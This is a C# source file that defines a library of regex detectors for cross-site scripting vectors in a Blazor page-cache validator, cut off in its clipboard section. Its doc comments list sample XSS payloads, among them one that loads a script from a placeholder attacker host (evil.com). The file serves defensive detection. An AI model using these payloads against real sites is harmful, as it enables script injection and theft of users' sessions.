using System.Text.RegularExpressions;

namespace EasyAppDev.Blazor.PageCache.Validation;

/// <summary>
/// Comprehensive library of XSS attack patterns organized by severity and type.
/// </summary>
/// <remarks>
/// This library implements detection for a wide range of XSS attack vectors including:
/// - Traditional script injection
/// - Event handler injection
/// - Protocol-based attacks (javascript:, data:, etc.)
/// - SVG-based attacks
/// - DOM clobbering
/// - Mutation XSS (mXSS)
/// - Browser-specific vectors
/// - Template injection (Angular, Vue, React, Handlebars, Mustache)
/// - CSS injection attacks
/// - WebSocket/EventSource attacks
/// - Web Worker/Service Worker injection
/// - Import maps and dynamic imports
/// - Shadow DOM attacks
/// - Clipboard API attacks
/// - WebAssembly injection
/// - Advanced encoding techniques
///
/// Patterns are organized by severity and executed in order of risk.
/// All patterns use compiled regex with appropriate timeouts for performance and ReDoS protection.
/// </remarks>
public static class XssPatternLibrary
{
    /// <summary>
    /// Timeout for regex matching operations to prevent ReDoS attacks.
    /// Set to 100ms which is safe for most legitimate content while preventing abuse.
    /// </summary>
    private static readonly TimeSpan RegexTimeout = TimeSpan.FromMilliseconds(100);

    /// <summary>
    /// Critical severity XSS patterns that pose immediate and severe security risks.
    /// These are checked first for early exit on detection.
    /// </summary>
    public static class Critical
    {
        /// <summary>
        /// Detects any script tags (most basic and critical XSS vector).
        /// Example: &lt;script&gt;alert(1)&lt;/script&gt;, &lt;SCRIPT&gt;, &lt;ScRiPt&gt;
        /// </summary>
        public static readonly Regex ScriptTag = new(
            @"<script[\s>]",
            RegexOptions.IgnoreCase | RegexOptions.Compiled,
            RegexTimeout);

        /// <summary>
        /// Detects inline event handlers (onclick, onerror, onload, etc.).
        /// Example: &lt;img onerror="alert(1)"&gt;
        /// </summary>
        public static readonly Regex InlineEventHandlers = new(
            @"on\w+\s*=",
            RegexOptions.IgnoreCase | RegexOptions.Compiled,
            RegexTimeout);

        /// <summary>
        /// Detects javascript: protocol in URLs, including variations with whitespace characters.
        /// Example: &lt;a href="javascript:alert(1)"&gt;, &lt;a href="java\nscript:alert(1)"&gt;
        /// Matches: javascript:, java script:, java\nscript:, java\tscript:
        /// </summary>
        public static readonly Regex JavaScriptProtocol = new(
            @"j\s*a\s*v\s*a\s*s\s*c\s*r\s*i\s*p\s*t\s*:",
            RegexOptions.IgnoreCase | RegexOptions.Compiled,
            RegexTimeout);

        /// <summary>
        /// Detects vbscript: protocol (legacy IE attack vector).
        /// Example: &lt;a href="vbscript:msgbox(1)"&gt;
        /// </summary>
        public static readonly Regex VbScriptProtocol = new(
            @"vbscript\s*:",
            RegexOptions.IgnoreCase | RegexOptions.Compiled,
            RegexTimeout);

        /// <summary>
        /// Detects script tags with dangerous content.
        /// Example: &lt;script&gt;eval(...)&lt;/script&gt;, &lt;script&gt;document.cookie&lt;/script&gt;
        /// </summary>
        public static readonly Regex DangerousScriptContent = new(
            @"<script[^>]*>.*?(eval|document\.cookie|window\.location|localStorage|sessionStorage)",
            RegexOptions.IgnoreCase | RegexOptions.Compiled | RegexOptions.Singleline,
            RegexTimeout);

        /// <summary>
        /// Detects base64 encoded scripts (common obfuscation technique).
        /// Example: &lt;script&gt;atob('YWxlcnQoMSk=')&lt;/script&gt;
        /// </summary>
        public static readonly Regex Base64EncodedScript = new(
            @"<script[^>]*>.*?atob\s*\(",
            RegexOptions.IgnoreCase | RegexOptions.Compiled | RegexOptions.Singleline,
            RegexTimeout);

        /// <summary>
        /// Detects CSS expression() for IE-based attacks.
        /// Example: &lt;style&gt;{expression(alert(1))}&lt;/style&gt;
        /// </summary>
        public static readonly Regex CssExpression = new(
            @"expression\s*\(",
            RegexOptions.IgnoreCase | RegexOptions.Compiled,
            RegexTimeout);
    }

    /// <summary>
    /// SVG-based XSS patterns. SVGs are a rich source of XSS vectors.
    /// </summary>
    public static class Svg
    {
        /// <summary>
        /// Detects SVG elements with onload handlers.
        /// Example: &lt;svg onload="alert(1)"&gt;
        /// </summary>
        public static readonly Regex SvgOnLoad = new(
            @"<svg[^>]*on\w+",
            RegexOptions.IgnoreCase | RegexOptions.Compiled,
            RegexTimeout);

        /// <summary>
        /// Detects SVG script elements.
        /// Example: &lt;svg&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;/svg&gt;
        /// </summary>
        public static readonly Regex SvgScript = new(
            @"<svg[^>]*>.*?<script",
            RegexOptions.IgnoreCase | RegexOptions.Compiled | RegexOptions.Singleline,
            RegexTimeout);

        /// <summary>
        /// Detects SVG animate elements that can trigger events.
        /// Example: &lt;svg&gt;&lt;animate onbegin="alert(1)" /&gt;&lt;/svg&gt;
        /// </summary>
        public static readonly Regex SvgAnimate = new(
            @"<animate[^>]*on\w+",
            RegexOptions.IgnoreCase | RegexOptions.Compiled,
            RegexTimeout);

        /// <summary>
        /// Detects SVG foreignObject with script content.
        /// Example: &lt;svg&gt;&lt;foreignObject&gt;&lt;script&gt;...&lt;/script&gt;&lt;/foreignObject&gt;&lt;/svg&gt;
        /// </summary>
        public static readonly Regex SvgForeignObject = new(
            @"<foreignObject[^>]*>.*?<script",
            RegexOptions.IgnoreCase | RegexOptions.Compiled | RegexOptions.Singleline,
            RegexTimeout);

        /// <summary>
        /// Detects MathML script elements (MathML can contain scripts like SVG).
        /// Example: &lt;math&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;/math&gt;
        /// </summary>
        public static readonly Regex MathMLScript = new(
            @"<math[^>]*>.*?<script",
            RegexOptions.IgnoreCase | RegexOptions.Compiled | RegexOptions.Singleline,
            RegexTimeout);
    }

    /// <summary>
    /// Image-based XSS patterns.
    /// </summary>
    public static class Image
    {
        /// <summary>
        /// Detects img tags with onerror handlers.
        /// Example: &lt;img src=x onerror="alert(1)"&gt;
        /// </summary>
        public static readonly Regex ImageOnError = new(
            @"<img[^>]*onerror",
            RegexOptions.IgnoreCase | RegexOptions.Compiled,
            RegexTimeout);

        /// <summary>
        /// Detects img tags with onload handlers.
        /// Example: &lt;img src=x onload="alert(1)"&gt;
        /// </summary>
        public static readonly Regex ImageOnLoad = new(
            @"<img[^>]*onload",
            RegexOptions.IgnoreCase | RegexOptions.Compiled,
            RegexTimeout);

        /// <summary>
        /// Detects img tags with javascript: protocol in src.
        /// Example: &lt;img src="javascript:alert(1)"&gt;
        /// </summary>
        public static readonly Regex ImageJavaScriptSrc = new(
            @"<img[^>]*src\s*=\s*[""']?\s*javascript:",
            RegexOptions.IgnoreCase | RegexOptions.Compiled,
            RegexTimeout);

        /// <summary>
        /// Detects img tags with data URIs containing scripts.
        /// Example: &lt;img src="data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;"&gt;
        /// </summary>
        public static readonly Regex ImageDataUri = new(
            @"<img[^>]*src\s*=\s*[""']?\s*data:text/html",
            RegexOptions.IgnoreCase | RegexOptions.Compiled,
            RegexTimeout);
    }

    /// <summary>
    /// Data URI-based XSS patterns.
    /// </summary>
    public static class DataUri
    {
        /// <summary>
        /// Detects data URIs with HTML content containing scripts.
        /// Example: data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;
        /// </summary>
        public static readonly Regex HtmlDataUriWithScript = new(
            @"data:text/html[^,]*,.*?<script",
            RegexOptions.IgnoreCase | RegexOptions.Compiled | RegexOptions.Singleline,
            RegexTimeout);

        /// <summary>
        /// Detects data URIs with base64 encoded HTML.
        /// Example: data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
        /// </summary>
        public static readonly Regex Base64HtmlDataUri = new(
            @"data:text/html[^,]*;base64",
            RegexOptions.IgnoreCase | RegexOptions.Compiled,
            RegexTimeout);

        /// <summary>
        /// Detects data URIs with SVG content.
        /// Example: data:image/svg+xml,&lt;svg onload=alert(1)&gt;
        /// </summary>
        public static readonly Regex SvgDataUri = new(
            @"data:image/svg\+xml",
            RegexOptions.IgnoreCase | RegexOptions.Compiled,
            RegexTimeout);
    }

    /// <summary>
    /// Form-based XSS patterns.
    /// </summary>
    public static class Form
    {
        /// <summary>
        /// Detects form elements with javascript: action.
        /// Example: &lt;form action="javascript:alert(1)"&gt;
        /// </summary>
        public static readonly Regex FormJavaScriptAction = new(
            @"<form[^>]*action\s*=\s*[""']?\s*javascript:",
            RegexOptions.IgnoreCase | RegexOptions.Compiled,
            RegexTimeout);

        /// <summary>
        /// Detects form elements with data URI action.
        /// Example: &lt;form action="data:text/html,..."&gt;
        /// </summary>
        public static readonly Regex FormDataUriAction = new(
            @"<form[^>]*action\s*=\s*[""']?\s*data:",
            RegexOptions.IgnoreCase | RegexOptions.Compiled,
            RegexTimeout);

        /// <summary>
        /// Detects formaction attribute with javascript: protocol.
        /// Example: &lt;button formaction="javascript:alert(1)"&gt;
        /// </summary>
        public static readonly Regex FormActionAttribute = new(
            @"formaction\s*=\s*[""']?\s*javascript:",
            RegexOptions.IgnoreCase | RegexOptions.Compiled,
            RegexTimeout);
    }

    /// <summary>
    /// IFrame-based XSS patterns.
    /// </summary>
    public static class IFrame
    {
        /// <summary>
        /// Detects iframe elements with javascript: protocol in src.
        /// Example: &lt;iframe src="javascript:alert(1)"&gt;
        /// </summary>
        public static readonly Regex IFrameJavaScriptSrc = new(
            @"<iframe[^>]*src\s*=\s*[""']?\s*javascript:",
            RegexOptions.IgnoreCase | RegexOptions.Compiled,
            RegexTimeout);

        /// <summary>
        /// Detects iframe elements with data URIs.
        /// Example: &lt;iframe src="data:text/html,&lt;script&gt;...&lt;/script&gt;"&gt;
        /// </summary>
        public static readonly Regex IFrameDataUri = new(
            @"<iframe[^>]*src\s*=\s*[""']?\s*data:text/html",
            RegexOptions.IgnoreCase | RegexOptions.Compiled,
            RegexTimeout);

        /// <summary>
        /// Detects iframe srcdoc attribute with scripts.
        /// Example: &lt;iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;"&gt;
        /// </summary>
        public static readonly Regex IFrameSrcDocWithScript = new(
            @"<iframe[^>]*srcdoc[^>]*<script",
            RegexOptions.IgnoreCase | RegexOptions.Compiled | RegexOptions.Singleline,
            RegexTimeout);
    }

    /// <summary>
    /// Meta tag-based XSS patterns.
    /// </summary>
    public static class Meta
    {
        /// <summary>
        /// Detects meta refresh tags with javascript: URLs.
        /// Example: &lt;meta http-equiv="refresh" content="0;url=javascript:alert(1)"&gt;
        /// </summary>
        public static readonly Regex MetaRefreshJavaScript = new(
            @"<meta[^>]*http-equiv\s*=\s*[""']?\s*refresh[^>]*javascript:",
            RegexOptions.IgnoreCase | RegexOptions.Compiled,
            RegexTimeout);

        /// <summary>
        /// Detects meta refresh tags with data URIs.
        /// Example: &lt;meta http-equiv="refresh" content="0;url=data:..."&gt;
        /// </summary>
        public static readonly Regex MetaRefreshDataUri = new(
            @"<meta[^>]*http-equiv\s*=\s*[""']?\s*refresh[^>]*data:",
            RegexOptions.IgnoreCase | RegexOptions.Compiled,
            RegexTimeout);
    }

    /// <summary>
    /// Link and base tag XSS patterns.
    /// </summary>
    public static class Link
    {
        /// <summary>
        /// Detects base tags with javascript: protocol.
        /// Example: &lt;base href="javascript:alert(1)"&gt;
        /// </summary>
        public static readonly Regex BaseJavaScript = new(
            @"<base[^>]*href\s*=\s*[""']?\s*javascript:",
            RegexOptions.IgnoreCase | RegexOptions.Compiled,
            RegexTimeout);

        /// <summary>
        /// Detects base tags with data URIs.
        /// Example: &lt;base href="data:text/html,..."&gt;
        /// </summary>
        public static readonly Regex BaseDataUri = new(
            @"<base[^>]*href\s*=\s*[""']?\s*data:",
            RegexOptions.IgnoreCase | RegexOptions.Compiled,
            RegexTimeout);

        /// <summary>
        /// Detects link tags with javascript: protocol in href.
        /// Example: &lt;link rel="stylesheet" href="javascript:alert(1)"&gt;
        /// </summary>
        public static readonly Regex LinkJavaScriptHref = new(
            @"<link[^>]*href\s*=\s*[""']?\s*javascript:",
            RegexOptions.IgnoreCase | RegexOptions.Compiled,
            RegexTimeout);

        /// <summary>
        /// Detects link tags importing stylesheets from data URIs.
        /// Example: &lt;link rel="stylesheet" href="data:text/css,..."&gt;
        /// </summary>
        public static readonly Regex LinkDataUri = new(
            @"<link[^>]*href\s*=\s*[""']?\s*data:",
            RegexOptions.IgnoreCase | RegexOptions.Compiled,
            RegexTimeout);

        /// <summary>
        /// Detects link tags with import relationship (can load malicious content).
        /// Example: &lt;link rel="import" href="..."&gt;
        /// </summary>
        public static readonly Regex LinkImport = new(
            @"<link[^>]*rel\s*=\s*[""']?\s*import",
            RegexOptions.IgnoreCase | RegexOptions.Compiled,
            RegexTimeout);
    }

    /// <summary>
    /// DOM clobbering attack patterns.
    /// </summary>
    public static class DomClobbering
    {
        /// <summary>
        /// Detects suspicious id attributes that could clobber window properties.
        /// Example: &lt;img id="location"&gt; can override window.location
        /// </summary>
        public static readonly Regex SuspiciousIdAttributes = new(
            @"id\s*=\s*[""']?\s*(location|top|parent|window|document|self|frames)",
            RegexOptions.IgnoreCase | RegexOptions.Compiled,
            RegexTimeout);

        /// <summary>
        /// Detects suspicious name attributes in forms that could clobber properties.
        /// Example: &lt;form name="location"&gt;&lt;input name="href"&gt;&lt;/form&gt;
        /// </summary>
        public static readonly Regex SuspiciousNameAttributes = new(
            @"name\s*=\s*[""']?\s*(location|top|parent|window|document|self|frames)",
            RegexOptions.IgnoreCase | RegexOptions.Compiled,
            RegexTimeout);

        /// <summary>
        /// Detects elements with both id and name set to the same dangerous value.
        /// This is a strong indicator of DOM clobbering attempts.
        /// </summary>
        public static readonly Regex DuplicateIdName = new(
            @"<\w+[^>]*(?:id|name)\s*=\s*[""']?(\w+)[""']?[^>]*(?:id|name)\s*=\s*[""']?\1",
            RegexOptions.IgnoreCase | RegexOptions.Compiled,
            RegexTimeout);
    }

    /// <summary>
    /// Mutation XSS (mXSS) patterns - attacks that exploit HTML parser quirks and encoding techniques.
    /// </summary>
    public static class MutationXss
    {
        /// <summary>
        /// Detects backticks in attribute values which can break out of contexts.
        /// Example: &lt;a href="` onclick=alert(1) `"&gt;
        /// </summary>
        public static readonly Regex BackticksInAttributes = new(
            @"=\s*[""'][^""']*`[^""']*[""']",
            RegexOptions.Compiled,
            RegexTimeout);

        /// <summary>
        /// Detects HTML entity encoded javascript protocol (decimal and hex encoding).
        /// Example: &lt;IMG SRC=&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;...&gt;
        /// Example: &lt;IMG SRC=j&amp;#X41vascript:...&gt; (mixed encoding)
        /// Matches fully or partially entity-encoded "javascript:" protocol.
        /// Each character position accepts: literal char, decimal entity, or hex entity
        /// </summary>
        public static readonly Regex EncodedJavaScriptProtocol = new(
            @"(?:&#[xX]?0*(?:106|6[aA]);?|[jJ])\s*(?:&#[xX]?0*(?:97|61|65|41);?|[aA])\s*(?:&#[xX]?0*(?:118|76|86|56);?|[vV])\s*(?:&#[xX]?0*(?:97|61|65|41);?|[aA])\s*(?:&#[xX]?0*(?:115|73|83|53);?|[sS])\s*(?:&#[xX]?0*(?:99|63|67|43);?|[cC])\s*(?:&#[xX]?0*(?:114|72|82|52);?|[rR])\s*(?:&#[xX]?0*(?:105|69|73|49);?|[iI])\s*(?:&#[xX]?0*(?:112|70|80|50);?|[pP])\s*(?:&#[xX]?0*(?:116|74|84|54);?|[tT])\s*(?:&#[xX]?0*(?:58|3[aA]);?|:)",
            RegexOptions.Compiled,
            RegexTimeout);

        /// <summary>
        /// Detects namespace confusion attacks.
        /// Example: &lt;x:script xmlns:x="http://www.w3.org/1999/xhtml"&gt;
        /// </summary>
        public static readonly Regex NamespaceConfusion = new(
            @"<\w+:script",
            RegexOptions.IgnoreCase | RegexOptions.Compiled,
            RegexTimeout);

        /// <summary>
        /// Detects mXSS via malformed tags that might be interpreted differently.
        /// Example: &lt;/style&gt;&lt;script&gt;alert(1)&lt;/script&gt;
        /// </summary>
        public static readonly Regex MalformedTags = new(
            @"</(?:style|title|textarea|noscript|template)>[^<]*<script",
            RegexOptions.IgnoreCase | RegexOptions.Compiled,
            RegexTimeout);

        /// <summary>
        /// Detects Unicode escape sequences in JavaScript code.
        /// Example: \u0061lert(1) which decodes to alert(1)
        /// Example: eval('\u0061lert(1)')
        /// </summary>
        public static readonly Regex UnicodeEscapeSequences = new(
            @"\\u[0-9a-fA-F]{4}",
            RegexOptions.Compiled,
            RegexTimeout);

        /// <summary>
        /// Detects hex escape sequences in JavaScript code.
        /// Example: \x61lert(1) which decodes to alert(1)
        /// </summary>
        public static readonly Regex HexEscapeSequences = new(
            @"\\x[0-9a-fA-F]{2}",
            RegexOptions.Compiled,
            RegexTimeout);

        /// <summary>
        /// Detects octal escape sequences in JavaScript code.
        /// Example: \141lert(1) which decodes to alert(1)
        /// </summary>
        public static readonly Regex OctalEscapeSequences = new(
            @"\\[0-7]{1,3}",
            RegexOptions.Compiled,
            RegexTimeout);

        /// <summary>
        /// Detects mixed encoding attacks combining multiple encoding techniques.
        /// Example: j\u0061v\x61script:\141lert(1)
        /// </summary>
        public static readonly Regex MixedEncodingAttack = new(
            @"(?:\\u[0-9a-fA-F]{4}|\\x[0-9a-fA-F]{2}|\\[0-7]{1,3}){2,}",
            RegexOptions.Compiled,
            RegexTimeout);

        /// <summary>
        /// Detects double URL encoding patterns.
        /// Example: %253Cscript%253E (double encoded &lt;script&gt;)
        /// </summary>
        public static readonly Regex DoubleUrlEncoding = new(
            @"%25(?:3[CcDd]|2[0-9FfEe]|5[BbDd]|7[BbDdEe])",
            RegexOptions.Compiled,
            RegexTimeout);

        /// <summary>
        /// Detects triple or multiple URL encoding.
        /// Example: %25253Cscript%25253E
        /// </summary>
        public static readonly Regex MultipleUrlEncoding = new(
            @"%(?:25){2,}",
            RegexOptions.Compiled,
            RegexTimeout);

        /// <summary>
        /// Detects UTF-7 encoded XSS attacks (legacy but still relevant).
        /// Example: +ADw-script+AD4-alert(1)+ADw-/script+AD4-
        /// </summary>
        public static readonly Regex Utf7EncodedAttack = new(
            @"\+AD[wW]-.*?\+AD[0Q]-",
            RegexOptions.Compiled,
            RegexTimeout);

        /// <summary>
        /// Detects NULL byte injection attempts.
        /// Example: &lt;scri\0pt&gt; or javascript:\0alert(1)
        /// </summary>
        public static readonly Regex NullByteInjection = new(
            @"\\0|%00|\x00",
            RegexOptions.Compiled,
            RegexTimeout);
    }

    /// <summary>
    /// Object and Embed tag XSS patterns.
    /// </summary>
    public static class ObjectEmbed
    {
        /// <summary>
        /// Detects object tags with data URIs.
        /// Example: &lt;object data="data:text/html,&lt;script&gt;...&lt;/script&gt;"&gt;
        /// </summary>
        public static readonly Regex ObjectDataUri = new(
            @"<object[^>]*data\s*=\s*[""']?\s*data:",
            RegexOptions.IgnoreCase | RegexOptions.Compiled,
            RegexTimeout);

        /// <summary>
        /// Detects embed tags with src pointing to javascript: or data:.
        /// Example: &lt;embed src="javascript:alert(1)"&gt;
        /// </summary>
        public static readonly Regex EmbedSuspiciousSrc = new(
            @"<embed[^>]*src\s*=\s*[""']?\s*(?:javascript:|data:)",
            RegexOptions.IgnoreCase | RegexOptions.Compiled,
            RegexTimeout);
    }

    /// <summary>
    /// Template injection patterns for modern JavaScript frameworks.
    /// </summary>
    public static class TemplateInjection
    {
        /// <summary>
        /// Detects Angular template injection via constructor access.
        /// Example: {{constructor.constructor('alert(1)')()}}
        /// Example: {{constructor['constructor']('alert(1)')()}}
        /// </summary>
        public static readonly Regex AngularConstructorInjection = new(
            @"\{\{.*?constructor[\['\.\]].*?constructor",
            RegexOptions.IgnoreCase | RegexOptions.Compiled,
            RegexTimeout);

        /// <summary>
        /// Detects Vue template injection via internal properties.
        /// Example: {{_c.constructor('alert(1)')()}}
        /// Example: {{$el.constructor.constructor('alert(1)')()}}
        /// </summary>
        public static readonly Regex VueInternalPropertyInjection = new(
            @"\{\{.*?(?:_c|\$el)\.constructor",
            RegexOptions.IgnoreCase | RegexOptions.Compiled,
            RegexTimeout);

        /// <summary>
        /// Detects React dangerouslySetInnerHTML usage.
        /// Example: dangerouslySetInnerHTML={{__html: '&lt;script&gt;alert(1)&lt;/script&gt;'}}
        /// </summary>
        public static readonly Regex ReactDangerousHtml = new(
            @"dangerouslySetInnerHTML\s*=",
            RegexOptions.IgnoreCase | RegexOptions.Compiled,
            RegexTimeout);

        /// <summary>
        /// Detects Handlebars triple-stash (unescaped) expressions.
        /// Example: {{{raw_content}}}
        /// </summary>
        public static readonly Regex HandlebarsTripleStash = new(
            @"\{\{\{[^}]*\}\}\}",
            RegexOptions.Compiled,
            RegexTimeout);

        /// <summary>
        /// Detects Mustache unescaped expressions.
        /// Example: {{{unescaped}}} or {{&amp;unescaped}}
        /// </summary>
        public static readonly Regex MustacheUnescaped = new(
            @"\{\{\{[^}]*\}\}\}|\{\{&amp;[^}]*\}\}",
            RegexOptions.Compiled,
            RegexTimeout);

        /// <summary>
        /// Detects generic template expressions with dangerous JavaScript code.
        /// Example: {{eval(...)}}, {{Function(...)}}, {{setTimeout(...)}}
        /// </summary>
        public static readonly Regex TemplateDangerousCode = new(
            @"\{\{.*?(?:eval|Function|setTimeout|setInterval|document\.cookie)\s*\(",
            RegexOptions.IgnoreCase | RegexOptions.Compiled,
            RegexTimeout);
    }

    /// <summary>
    /// Advanced CSS injection patterns beyond basic expression().
    /// </summary>
    public static class CssInjection
    {
        /// <summary>
        /// Detects CSS @import with javascript: protocol.
        /// Example: @import "javascript:alert(1)"
        /// Example: @import url(javascript:alert(1))
        /// </summary>
        public static readonly Regex CssImportJavaScript = new(
            @"@import\s*(?:url\s*\()?\s*[""']?\s*javascript:",
            RegexOptions.IgnoreCase | RegexOptions.Compiled,
            RegexTimeout);

        /// <summary>
        /// Detects Mozilla XBL (XML Binding Language) binding attacks.
        /// Example: -moz-binding: url(xss.xml#xss)
        /// </summary>
        public static readonly Regex MozBindingAttack = new(
            @"-moz-binding\s*:",
            RegexOptions.IgnoreCase | RegexOptions.Compiled,
            RegexTimeout);

        /// <summary>
        /// Detects CSS url() with javascript: or data: protocols.
        /// Example: background: url(javascript:alert(1))
        /// Example: background: url(data:text/html,&lt;script&gt;...)
        /// </summary>
        public static readonly Regex CssUrlProtocolAttack = new(
            @"url\s*\(\s*[""']?\s*(?:javascript:|data:text/html)",
            RegexOptions.IgnoreCase | RegexOptions.Compiled,
            RegexTimeout);

        /// <summary>
        /// Detects CSS behavior property (IE-specific attack vector).
        /// Example: behavior: url(xss.htc)
        /// </summary>
        public static readonly Regex CssBehaviorProperty = new(
            @"behavior\s*:\s*url\s*\(",
            RegexOptions.IgnoreCase | RegexOptions.Compiled,
            RegexTimeout);

        /// <summary>
        /// Detects CSS @keyframes with animation event handlers.
        /// Example: @keyframes x{from{opacity:0}to{opacity:1}}
        /// Combined with: animation: x 1s; animationstart event
        /// </summary>
        public static readonly Regex CssKeyframesWithEvents = new(
            @"@keyframes[^{]*\{.*?(?:onanimationstart|onanimationend|onanimationiteration)",
            RegexOptions.IgnoreCase | RegexOptions.Compiled | RegexOptions.Singleline,
            RegexTimeout);

        /// <summary>
        /// Detects CSS @import with data: URI.
        /// Example: @import url(data:text/css,body{background:url(javascript:alert(1))})
        /// </summary>
        public static readonly Regex CssImportDataUri = new(
            @"@import\s*(?:url\s*\()?\s*[""']?\s*data:",
            RegexOptions.IgnoreCase | RegexOptions.Compiled,
            RegexTimeout);
    }

    /// <summary>
    /// WebSocket and EventSource XSS patterns.
    /// </summary>
    public static class WebProtocols
    {
        /// <summary>
        /// Detects WebSocket constructor with javascript: protocol.
        /// Example: new WebSocket('javascript:alert(1)')
        /// </summary>
        public static readonly Regex WebSocketJavaScriptProtocol = new(
            @"new\s+WebSocket\s*\(\s*[""']?\s*javascript:",
            RegexOptions.IgnoreCase | RegexOptions.Compiled,
            RegexTimeout);

        /// <summary>
        /// Detects EventSource constructor with suspicious URLs.
        /// Example: new EventSource('data:text/event-stream,...')
        /// </summary>
        public static readonly Regex EventSourceSuspicious = new(
            @"new\s+EventSource\s*\(\s*[""']?\s*(?:javascript:|data:)",
            RegexOptions.IgnoreCase | RegexOptions.Compiled,
            RegexTimeout);

        /// <summary>
        /// Detects Server-Sent Events with malicious content.
        /// Example: Content-Type: text/event-stream with embedded scripts
        /// </summary>
        public static readonly Regex ServerSentEventsMalicious = new(
            @"text/event-stream[^<]*<script",
            RegexOptions.IgnoreCase | RegexOptions.Compiled,
            RegexTimeout);

        /// <summary>
        /// Detects WebSocket URL with data: protocol (attempt to inject data).
        /// Example: ws://example.com?data=data:text/html,...
        /// </summary>
        public static readonly Regex WebSocketDataProtocol = new(
            @"new\s+WebSocket\s*\([^)]*data:",
            RegexOptions.IgnoreCase | RegexOptions.Compiled,
            RegexTimeout);
    }

    /// <summary>
    /// Web Worker and Service Worker injection patterns.
    /// </summary>
    public static class Workers
    {
        /// <summary>
        /// Detects Worker constructor with data: URI.
        /// Example: new Worker('data:text/javascript,alert(1)')
        /// </summary>
        public static readonly Regex WorkerDataUri = new(
            @"new\s+Worker\s*\(\s*[""']?\s*data:",
            RegexOptions.IgnoreCase | RegexOptions.Compiled,
            RegexTimeout);

        /// <summary>
        /// Detects SharedWorker with javascript: protocol.
        /// Example: new SharedWorker('javascript:alert(1)')
        /// </summary>
        public static readonly Regex SharedWorkerJavaScript = new(
            @"new\s+SharedWorker\s*\(\s*[""']?\s*javascript:",
            RegexOptions.IgnoreCase | RegexOptions.Compiled,
            RegexTimeout);

        /// <summary>
        /// Detects ServiceWorker registration with malicious scripts.
        /// Example: navigator.serviceWorker.register('data:text/javascript,...')
        /// </summary>
        public static readonly Regex ServiceWorkerRegister = new(
            @"serviceWorker\.register\s*\(\s*[""']?\s*(?:javascript:|data:)",
            RegexOptions.IgnoreCase | RegexOptions.Compiled,
            RegexTimeout);

        /// <summary>
        /// Detects importScripts() with external sources in workers.
        /// Example: importScripts('http://evil.com/malicious.js')
        /// </summary>
        public static readonly Regex ImportScriptsSuspicious = new(
            @"importScripts\s*\(\s*[""']?\s*(?:https?:|data:|javascript:)",
            RegexOptions.IgnoreCase | RegexOptions.Compiled,
            RegexTimeout);

        /// <summary>
        /// Detects Worker with blob: URLs that might contain malicious code.
        /// Example: new Worker(URL.createObjectURL(new Blob(['malicious code'])))
        /// </summary>
        public static readonly Regex WorkerBlobUrl = new(
            @"new\s+Worker\s*\([^)]*(?:blob:|createObjectURL)",
            RegexOptions.IgnoreCase | RegexOptions.Compiled,
            RegexTimeout);
    }

    /// <summary>
    /// Import maps and module injection patterns.
    /// </summary>
    public static class ModuleInjection
    {
        /// <summary>
        /// Detects script type="importmap" with suspicious mappings.
        /// Example: &lt;script type="importmap"&gt;{"imports":{"react":"javascript:alert(1)"}}&lt;/script&gt;
        /// </summary>
        public static readonly Regex ImportMapSuspicious = new(
            @"<script[^>]*type\s*=\s*[""']?\s*importmap[^>]*>.*?javascript:",
            RegexOptions.IgnoreCase | RegexOptions.Compiled | RegexOptions.Singleline,
            RegexTimeout);

        /// <summary>
        /// Detects dynamic import() with user-controlled specifiers.
        /// Example: import(userInput)
        /// </summary>
        public static readonly Regex DynamicImportSuspicious = new(
            @"import\s*\(\s*[""']?\s*(?:javascript:|data:)",
            RegexOptions.IgnoreCase | RegexOptions.Compiled,
            RegexTimeout);

        /// <summary>
        /// Detects import.meta manipulation attempts.
        /// Example: import.meta.url = 'javascript:alert(1)'
        /// </summary>
        public static readonly Regex ImportMetaManipulation = new(
            @"import\.meta\.\w+\s*=.*?(?:javascript:|data:)",
            RegexOptions.IgnoreCase | RegexOptions.Compiled,
            RegexTimeout);

        /// <summary>
        /// Detects script type="module" with inline dangerous code.
        /// Example: &lt;script type="module"&gt;eval(...)&lt;/script&gt;
        /// </summary>
        public static readonly Regex ModuleScriptDangerous = new(
            @"<script[^>]*type\s*=\s*[""']?\s*module[^>]*>.*?(?:eval|Function)\s*\(",
            RegexOptions.IgnoreCase | RegexOptions.Compiled | RegexOptions.Singleline,
            RegexTimeout);
    }

    /// <summary>
    /// Shadow DOM attack patterns.
    /// </summary>
    public static class ShadowDom
    {
        /// <summary>
        /// Detects template elements with script content.
        /// Example: &lt;template&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;/template&gt;
        /// </summary>
        public static readonly Regex TemplateWithScript = new(
            @"<template[^>]*>.*?<script",
            RegexOptions.IgnoreCase | RegexOptions.Compiled | RegexOptions.Singleline,
            RegexTimeout);

        /// <summary>
        /// Detects custom elements with malicious lifecycle callbacks.
        /// Example: customElements.define('x-foo', class extends HTMLElement { connectedCallback(){alert(1)} })
        /// </summary>
        public static readonly Regex CustomElementMalicious = new(
            @"customElements\.define\s*\([^)]*\).*?(?:connectedCallback|disconnectedCallback|attributeChangedCallback).*?(?:eval|Function|document\.cookie)",
            RegexOptions.IgnoreCase | RegexOptions.Compiled | RegexOptions.Singleline,
            RegexTimeout);

        /// <summary>
        /// Detects slot injection attacks in shadow DOM.
        /// Example: &lt;slot name="&lt;script&gt;alert(1)&lt;/script&gt;"&gt;&lt;/slot&gt;
        /// </summary>
        public static readonly Regex SlotInjection = new(
            @"<slot[^>]*name\s*=\s*[""'][^""']*<script",
            RegexOptions.IgnoreCase | RegexOptions.Compiled,
            RegexTimeout);

        /// <summary>
        /// Detects attachShadow with dangerous mode or content.
        /// Example: element.attachShadow({mode:'open'}).innerHTML = '&lt;script&gt;...'
        /// </summary>
        public static readonly Regex AttachShadowMalicious = new(
            @"attachShadow\s*\([^)]*\).*?\.innerHTML\s*=.*?<script",
            RegexOptions.IgnoreCase | RegexOptions.Compiled | RegexOptions.Singleline,
            RegexTimeout);
    }

    /// <summary>
    /// Clipboard API attack patterns.
    /// </summary>
    public static class ClipboardApi
    {
        /// <summary>
        /// Detects document.execCommand('paste') which can access clipboard.
        /// Example: document.execCommand('paste')
        /// </summary>
